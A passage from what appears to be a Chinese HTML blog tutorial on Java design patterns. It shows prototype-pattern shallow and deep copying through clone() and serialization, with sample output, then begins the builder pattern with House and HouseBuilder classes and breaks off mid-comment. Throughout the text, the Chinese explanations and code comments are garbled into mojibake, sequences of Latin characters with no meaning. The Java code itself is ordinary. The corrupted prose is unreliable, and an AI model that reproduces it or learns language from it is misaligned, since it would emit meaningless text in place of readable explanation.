é€’ï¼Œä¹Ÿå°±æ˜¯å°†è¯¥å±æ€§å€¼å¤åˆ¶ä¸€ä»½ç»™æ–°çš„å¯¹è±¡ã€‚</p></li><li><p>å¯¹äºæ•°æ®ç±»å‹æ˜¯å¼•ç”¨æ•°æ®ç±»å‹çš„æˆå‘˜å˜é‡ï¼Œæ¯”å¦‚è¯´æˆå‘˜å˜é‡æ˜¯æŸä¸ªæ•°ç»„ã€æŸä¸ªç±»çš„å¯¹è±¡ç­‰ï¼Œé‚£ä¹ˆæµ…æ‹·è´ä¼šè¿›è¡Œå¼•ç”¨ä¼ é€’ï¼Œä¹Ÿå°±æ˜¯åªæ˜¯å°†è¯¥æˆå‘˜å˜é‡çš„å¼•ç”¨å€¼ï¼ˆå†…å­˜åœ°å€ï¼‰å¤åˆ¶ä¸€ä»½ç»™æ–°çš„å¯¹è±¡ã€‚å› ä¸ºå®é™…ä¸Šä¸¤ä¸ªå¯¹è±¡çš„è¯¥æˆå‘˜å˜é‡éƒ½æŒ‡å‘åŒä¸€ä¸ªå®ä¾‹ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåœ¨ä¸€ä¸ªå¯¹è±¡ä¸­ä¿®æ”¹è¯¥æˆå‘˜å˜é‡ä¼šå½±å“åˆ°å¦ä¸€ä¸ªå¯¹è±¡çš„è¯¥æˆå‘˜å˜é‡å€¼</p></li><li><p>å‰é¢æˆ‘ä»¬å…‹éš†Shape å°±æ˜¯æµ…æ‹·è´</p></li><li><p>æµ…æ‹·è´æ˜¯ä½¿ç”¨é»˜è®¤çš„ clone()æ–¹æ³•æ¥å®ç°</p></li></ol><p>sheep = (Sheep) super.clone();</p><h3 id="æ·±æ‹·è´åŸºæœ¬ä»‹ç»"><a class="markdownIt-Anchor" href="#æ·±æ‹·è´åŸºæœ¬ä»‹ç»"></a> æ·±æ‹·è´åŸºæœ¬ä»‹ç»</h3><ol><li><p>å¤åˆ¶å¯¹è±¡çš„æ‰€æœ‰åŸºæœ¬æ•°æ®ç±»å‹çš„æˆå‘˜å˜é‡å€¼</p></li><li><p>ä¸ºæ‰€æœ‰å¼•ç”¨æ•°æ®ç±»å‹çš„æˆå‘˜å˜é‡ç”³è¯·å­˜å‚¨ç©ºé—´ï¼Œå¹¶å¤åˆ¶æ¯ä¸ªå¼•ç”¨æ•°æ®ç±»å‹æˆå‘˜å˜é‡æ‰€å¼•ç”¨çš„å¯¹è±¡ï¼Œç›´åˆ°è¯¥å¯¹è±¡å¯è¾¾çš„æ‰€æœ‰å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>å¯¹è±¡è¿›è¡Œæ·±æ‹·è´è¦å¯¹æ•´ä¸ªå¯¹è±¡(åŒ…æ‹¬å¯¹è±¡çš„å¼•ç”¨ç±»å‹)è¿›è¡Œæ‹·è´</strong></p></li><li><p>æ·±æ‹·è´å®ç°æ–¹å¼ 1ï¼šé‡å†™ <strong>clone</strong> æ–¹æ³•æ¥å®ç°æ·±æ‹·è´</p></li><li><p>æ·±æ‹·è´å®ç°æ–¹å¼ 2ï¼šé€šè¿‡<strong>å¯¹è±¡åºåˆ—åŒ–</strong>å®ç°æ·±æ‹·è´(æ¨è)</p></li></ol><p><code>DeepCloneableTarget</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.deepclone;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepCloneableTarget</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>, Cloneable &#123;<br>   <br>   <span class="hljs-comment">/**</span><br><span class="hljs-comment">    * </span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>   <span class="hljs-keyword">private</span> String cloneName;<br><br>   <span class="hljs-keyword">private</span> String cloneClass;<br><br>   <span class="hljs-comment">//æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">DeepCloneableTarget</span><span class="hljs-params">(String cloneName, String cloneClass)</span> &#123;<br>      <span class="hljs-built_in">this</span>.cloneName = cloneName;<br>      <span class="hljs-built_in">this</span>.cloneClass = cloneClass;<br>   &#125;<br><br>   <span class="hljs-comment">//å› ä¸ºè¯¥ç±»çš„å±æ€§ï¼Œéƒ½æ˜¯String , å› æ­¤æˆ‘ä»¬è¿™é‡Œä½¿ç”¨é»˜è®¤çš„cloneå®Œæˆå³å¯</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CloneNotSupportedException &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.clone();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>DeepProtoType</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.deepclone;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepProtoType</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>, Cloneable&#123;<br>   <br>   <span class="hljs-keyword">public</span> String name; <span class="hljs-comment">//String å±æ€§</span><br>   <span class="hljs-keyword">public</span> DeepCloneableTarget deepCloneableTarget;<span class="hljs-comment">// å¼•ç”¨ç±»å‹</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">DeepProtoType</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>   &#125;<br><br><br><br>   <span class="hljs-comment">//æ·±æ‹·è´ - æ–¹å¼ 1 ä½¿ç”¨clone æ–¹æ³•</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CloneNotSupportedException &#123;<br><br>      <span class="hljs-type">Object</span> <span class="hljs-variable">deep</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-comment">//è¿™é‡Œå®Œæˆå¯¹åŸºæœ¬æ•°æ®ç±»å‹(å±æ€§)å’ŒStringçš„å…‹éš†</span><br>      deep = <span class="hljs-built_in">super</span>.clone();<br>      <span class="hljs-comment">//å¯¹å¼•ç”¨ç±»å‹çš„å±æ€§ï¼Œè¿›è¡Œå•ç‹¬å¤„ç†</span><br>      <span class="hljs-type">DeepProtoType</span> <span class="hljs-variable">deepProtoType</span> <span class="hljs-operator">=</span> (DeepProtoType)deep;<br>      deepProtoType.deepCloneableTarget  = (DeepCloneableTarget)deepCloneableTarget.clone();<br><br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> deepProtoType;<br>   &#125;<br>   <br>   <span class="hljs-comment">//æ·±æ‹·è´ - æ–¹å¼2 é€šè¿‡å¯¹è±¡çš„åºåˆ—åŒ–å®ç° (æ¨è)</span><br>   <br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">deepClone</span><span class="hljs-params">()</span> &#123;<br>      <br>      <span class="hljs-comment">//åˆ›å»ºæµå¯¹è±¡</span><br>      <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <br>      <span class="hljs-keyword">try</span> &#123;<br>         <br>         <span class="hljs-comment">//åºåˆ—åŒ–</span><br>         bos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>         oos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);<br>         oos.writeObject(<span class="hljs-built_in">this</span>); <span class="hljs-comment">//å½“å‰è¿™ä¸ªå¯¹è±¡ä»¥å¯¹è±¡æµçš„æ–¹å¼è¾“å‡º</span><br>         <br>         <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>         bis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bos.toByteArray());<br>         ois = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bis);<br>         <span class="hljs-type">DeepProtoType</span> <span class="hljs-variable">copyObj</span> <span class="hljs-operator">=</span> (DeepProtoType)ois.readObject();<br>         <br>         <span class="hljs-keyword">return</span> copyObj;<br>         <br>      &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>         <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> handle exception</span><br>         e.printStackTrace();<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>      &#125; <span class="hljs-keyword">finally</span> &#123;<br>         <span class="hljs-comment">//å…³é—­æµ</span><br>         <span class="hljs-keyword">try</span> &#123;<br>            bos.close();<br>            oos.close();<br>            bis.close();<br>            ois.close();<br>         &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> handle exception</span><br>            System.out.println(e2.getMessage());<br>         &#125;<br>      &#125;<br>      <br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.deepclone;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">DeepProtoType</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeepProtoType</span>();<br>      p.name = <span class="hljs-string">&quot;å®‹æ±Ÿ&quot;</span>;<br>      p.deepCloneableTarget = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeepCloneableTarget</span>(<span class="hljs-string">&quot;å¤§ç‰›&quot;</span>, <span class="hljs-string">&quot;å°ç‰›&quot;</span>);<br>      <br><span class="hljs-comment">//    æ–¹å¼1 å®Œæˆæ·±æ‹·è´</span><br>      <br>      <span class="hljs-type">DeepProtoType</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> (DeepProtoType) p.clone();<br><br>      System.out.println(<span class="hljs-string">&quot;p.name=&quot;</span> + p.name + <span class="hljs-string">&quot;p.deepCloneableTarget=&quot;</span> + p.deepCloneableTarget.hashCode());<br>      System.out.println(<span class="hljs-string">&quot;p2.name=&quot;</span> + p.name + <span class="hljs-string">&quot;p2.deepCloneableTarget=&quot;</span> + p1.deepCloneableTarget.hashCode());<br>   <br>      <span class="hljs-comment">//æ–¹å¼2 å®Œæˆæ·±æ‹·è´</span><br>      <span class="hljs-type">DeepProtoType</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> (DeepProtoType) p.deepClone();<br>      <br>      System.out.println(<span class="hljs-string">&quot;p.name=&quot;</span> + p.name + <span class="hljs-string">&quot;p.deepCloneableTarget=&quot;</span> + p.deepCloneableTarget.hashCode());<br>      System.out.println(<span class="hljs-string">&quot;p2.name=&quot;</span> + p.name + <span class="hljs-string">&quot;p2.deepCloneableTarget=&quot;</span> + p2.deepCloneableTarget.hashCode());<br>   <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><p>p.name=å®‹æ±Ÿp.deepCloneableTarget=1360875712<br />p2.name=å®‹æ±Ÿp2.deepCloneableTarget=1625635731<br />p.name=å®‹æ±Ÿp.deepCloneableTarget=1360875712<br />p2.name=å®‹æ±Ÿp2.deepCloneableTarget=824909230</p><p>æ³¨é‡Š<code>DeepProtoType</code>ä¸­çš„ä¸€ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å¯¹å¼•ç”¨ç±»å‹çš„å±æ€§ï¼Œè¿›è¡Œå•ç‹¬å¤„ç†</span><br>     <span class="hljs-type">DeepProtoType</span> <span class="hljs-variable">deepProtoType</span> <span class="hljs-operator">=</span> (DeepProtoType)deep;<br>     deepProtoType.deepCloneableTarget  = (DeepCloneableTarget)deepCloneableTarget.clone();<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><p>p.name=å®‹æ±Ÿp.deepCloneableTarget=1360875712<br />p2.name=å®‹æ±Ÿp2.deepCloneableTarget=1360875712<br />p.name=å®‹æ±Ÿp.deepCloneableTarget=1360875712<br />p2.name=å®‹æ±Ÿp2.deepCloneableTarget=664223387</p><h1 id="å»ºé€ è€…æ¨¡å¼"><a class="markdownIt-Anchor" href="#å»ºé€ è€…æ¨¡å¼"></a> <mark>å»ºé€ è€…æ¨¡å¼</mark></h1><p>å»ºé€ è€…æ¨¡å¼ï¼ˆBuilderPatternï¼‰ä½¿ç”¨å¤šä¸ªç®€å•çš„å¯¹è±¡ä¸€æ­¥ä¸€æ­¥æ„å»ºæˆä¸€ä¸ªå¤æ‚çš„å¯¹è±¡ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºåˆ›å»ºå‹æ¨¡å¼ï¼Œå®ƒæä¾›äº†ä¸€ç§åˆ›å»ºå¯¹è±¡çš„æœ€ä½³æ–¹å¼ã€‚</p><p>å»ºé€ è€…æ¨¡å¼ï¼ˆ<strong>Builder Pattern</strong>ï¼‰ åˆå«<strong>ç”Ÿæˆå™¨æ¨¡å¼</strong>ï¼Œæ˜¯ä¸€ç§å¯¹è±¡<strong>æ„å»ºæ¨¡å¼</strong>ã€‚å®ƒå¯ä»¥å°†å¤æ‚å¯¹è±¡çš„å»ºé€ è¿‡ç¨‹æŠ½è±¡å‡ºæ¥ï¼ˆæŠ½è±¡ç±»åˆ«ï¼‰ï¼Œä½¿è¿™ä¸ªæŠ½è±¡è¿‡ç¨‹çš„ä¸åŒå®ç°æ–¹æ³•å¯ä»¥æ„é€ å‡ºä¸åŒè¡¨ç°ï¼ˆå±æ€§ï¼‰çš„å¯¹è±¡ã€‚</p><p>å»ºé€ è€…æ¨¡å¼ æ˜¯ä¸€æ­¥ä¸€æ­¥åˆ›å»ºä¸€ä¸ªå¤æ‚çš„å¯¹è±¡ï¼Œå®ƒå…è®¸ç”¨æˆ·åªé€šè¿‡æŒ‡å®šå¤æ‚å¯¹è±¡çš„ç±»å‹å’Œå†…å®¹å°±å¯ä»¥æ„å»ºå®ƒä»¬ï¼Œç”¨æˆ·ä¸éœ€è¦çŸ¥é“å†…éƒ¨çš„å…·ä½“æ„å»ºç»†èŠ‚ã€‚</p><p>ä¸€ä¸ª Builder ç±»ä¼šä¸€æ­¥ä¸€æ­¥æ„é€ æœ€ç»ˆçš„å¯¹è±¡ã€‚è¯¥ Builder ç±»æ˜¯ç‹¬ç«‹äºå…¶ä»–å¯¹è±¡çš„ã€‚</p><h2 id="ä»‹ç»-4"><a class="markdownIt-Anchor" href="#ä»‹ç»-4"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> å°†ä¸€ä¸ªå¤æ‚çš„æ„å»ºä¸å…¶è¡¨ç¤ºç›¸åˆ†ç¦»ï¼Œä½¿å¾—åŒæ ·çš„æ„å»ºè¿‡ç¨‹å¯ä»¥åˆ›å»ºä¸åŒçš„è¡¨ç¤ºã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong><br />ä¸»è¦è§£å†³åœ¨è½¯ä»¶ç³»ç»Ÿä¸­ï¼Œæœ‰æ—¶å€™é¢ä¸´ç€&quot;ä¸€ä¸ªå¤æ‚å¯¹è±¡&quot;çš„åˆ›å»ºå·¥ä½œï¼Œå…¶é€šå¸¸ç”±å„ä¸ªéƒ¨åˆ†çš„å­å¯¹è±¡ç”¨ä¸€å®šçš„ç®—æ³•æ„æˆï¼›ç”±äºéœ€æ±‚çš„å˜åŒ–ï¼Œè¿™ä¸ªå¤æ‚å¯¹è±¡çš„å„ä¸ªéƒ¨åˆ†ç»å¸¸é¢ä¸´ç€å‰§çƒˆçš„å˜åŒ–ï¼Œä½†æ˜¯å°†å®ƒä»¬ç»„åˆåœ¨ä¸€èµ·çš„ç®—æ³•å´ç›¸å¯¹ç¨³å®šã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> ä¸€äº›åŸºæœ¬éƒ¨ä»¶ä¸ä¼šå˜ï¼Œè€Œå…¶ç»„åˆç»å¸¸å˜åŒ–çš„æ—¶å€™ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> å°†å˜ä¸ä¸å˜åˆ†ç¦»å¼€ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> å»ºé€ è€…ï¼šåˆ›å»ºå’Œæä¾›å®ä¾‹ï¼Œå¯¼æ¼”ï¼šç®¡ç†å»ºé€ å‡ºæ¥çš„å®ä¾‹çš„ä¾èµ–å…³ç³»ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€å»è‚¯å¾·åŸºï¼Œæ±‰å ¡ã€å¯ä¹ã€è–¯æ¡ã€ç‚¸é¸¡ç¿…ç­‰æ˜¯ä¸å˜çš„ï¼Œè€Œå…¶ç»„åˆæ˜¯ç»å¸¸å˜åŒ–çš„ï¼Œç”Ÿæˆå‡ºæ‰€è°“çš„&quot;å¥—é¤&quot;ã€‚ 2ã€JAVA ä¸­çš„StringBuilderã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€å»ºé€ è€…ç‹¬ç«‹ï¼Œæ˜“æ‰©å±•ã€‚ 2ã€ä¾¿äºæ§åˆ¶ç»†èŠ‚é£é™©ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> 1ã€äº§å“å¿…é¡»æœ‰å…±åŒç‚¹ï¼ŒèŒƒå›´æœ‰é™åˆ¶ã€‚ 2ã€å¦‚å†…éƒ¨å˜åŒ–å¤æ‚ï¼Œä¼šæœ‰å¾ˆå¤šçš„å»ºé€ ç±»ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€éœ€è¦ç”Ÿæˆçš„å¯¹è±¡å…·æœ‰å¤æ‚çš„å†…éƒ¨ç»“æ„ã€‚ 2ã€éœ€è¦ç”Ÿæˆçš„å¯¹è±¡å†…éƒ¨å±æ€§æœ¬èº«ç›¸äº’ä¾èµ–ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> ä¸å·¥å‚æ¨¡å¼çš„åŒºåˆ«æ˜¯ï¼šå»ºé€ è€…æ¨¡å¼æ›´åŠ å…³æ³¨ä¸é›¶ä»¶è£…é…çš„é¡ºåºã€‚</p><p><strong>å»ºé€ è€…æ¨¡å¼çš„å››ä¸ªè§’è‰²ï¼š</strong></p><p>1ã€Productï¼ˆäº§å“è§’è‰²ï¼‰ï¼š ä¸€ä¸ªå…·ä½“çš„äº§å“å¯¹è±¡ã€‚</p><p>2ã€ Builderï¼ˆæŠ½è±¡å»ºé€ è€…ï¼‰ï¼š åˆ›å»ºä¸€ä¸ª Product å¯¹è±¡çš„å„ä¸ªéƒ¨ä»¶æŒ‡å®šçš„ <strong>æ¥å£/æŠ½è±¡ç±»</strong>ã€‚</p><p>3ã€ConcreteBuilderï¼ˆå…·ä½“å»ºé€ è€…ï¼‰ï¼š å®ç°æ¥å£ï¼Œæ„å»ºå’Œè£…é…å„ä¸ªéƒ¨ä»¶ã€‚</p><p>4ã€Directorï¼ˆæŒ‡æŒ¥è€…ï¼‰ï¼š æ„å»ºä¸€ä¸ªä½¿ç”¨ Builder æ¥å£çš„å¯¹è±¡ã€‚å®ƒä¸»è¦æ˜¯ç”¨äºåˆ›å»ºä¸€ä¸ªå¤æ‚çš„å¯¹è±¡ã€‚å®ƒä¸»è¦æœ‰ä¸¤ä¸ªä½œç”¨ï¼Œä¸€æ˜¯ï¼šéš”ç¦»äº†å®¢æˆ·ä¸å¯¹è±¡çš„ç”Ÿäº§è¿‡ç¨‹ï¼ŒäºŒæ˜¯ï¼šè´Ÿè´£æ§åˆ¶äº§å“å¯¹è±¡çš„ç”Ÿäº§è¿‡ç¨‹ã€‚</p><p><strong>å»ºé€ è€…æ¨¡å¼åŸç†ç±»å›¾ï¼š</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224193125327.png" alt="image-20221224193125327" /></p><ol><li>éœ€è¦å»ºæˆ¿å­ï¼šè¿™ä¸€è¿‡ç¨‹ä¸ºæ‰“æ¡©ã€ç Œå¢™ã€å°é¡¶ã€‚ä¸ç®¡æ˜¯æ™®é€šæˆ¿å­ä¹Ÿå¥½ï¼Œåˆ«å¢…ä¹Ÿå¥½éƒ½éœ€è¦ç»å†è¿™äº›è¿‡ç¨‹ï¼Œä¸‹é¢æˆ‘ä»¬</li></ol><p>ä½¿ç”¨å»ºé€ è€…æ¨¡å¼(Builder Pattern)æ¥å®Œæˆ</p><ol start="2"><li>æ€è·¯åˆ†æå›¾è§£(ç±»å›¾)</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224213529759.png" alt="image-20221224213529759" /></p><h2 id="å®ç°-3"><a class="markdownIt-Anchor" href="#å®ç°-3"></a> å®ç°</h2><p><code>House</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.builder.improve;<br><br><span class="hljs-comment">//äº§å“-&gt;Product</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">House</span> &#123;<br>   <span class="hljs-keyword">private</span> String baise;<br>   <span class="hljs-keyword">private</span> String wall;<br>   <span class="hljs-keyword">private</span> String roofed;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getBaise</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> baise;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBaise</span><span class="hljs-params">(String baise)</span> &#123;<br>      <span class="hljs-built_in">this</span>.baise = baise;<br>   &#125;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getWall</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> wall;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setWall</span><span class="hljs-params">(String wall)</span> &#123;<br>      <span class="hljs-built_in">this</span>.wall = wall;<br>   &#125;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRoofed</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> roofed;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRoofed</span><span class="hljs-params">(String roofed)</span> &#123;<br>      <span class="hljs-built_in">this</span>.roofed = roofed;<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>HouseBuilder</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.builder.improve;<br><br><br><span class="hljs-comment">// æŠ½è±¡çš„å»ºé€ è€…</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HouseBuilder</span> &#123;<br><br>   <span class="hljs-keyword">protected</span> <span class="hljs-type">House</span> <span class="hljs-variable">house</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">House</span>();<br>   <br>   <span class="hljs-comment">//å°†å»ºé€ çš„æµç¨‹å†™å¥½, æŠ½è±¡çš„æ–¹æ³•</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildBasic</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildWalls</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">roofed</span><span class="hljs-params">()</span>;<br>   <br>   <span class="hljs-comment">//å»ºé€ æˆ¿å­å¥½ï¼Œ 